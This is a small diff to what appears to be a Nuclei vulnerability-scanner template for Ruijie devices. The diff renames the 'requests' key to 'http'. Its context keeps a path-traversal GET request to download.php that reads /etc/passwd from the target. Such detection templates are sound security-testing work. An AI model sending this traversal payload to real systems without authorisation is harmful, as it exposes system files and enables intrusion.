@@ -4,7 +4,7 @@ info:
   author: str1am
   severity: high
   tags: ruijie
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/download.php?a=read_txt&file=../../../../etc/passwd"
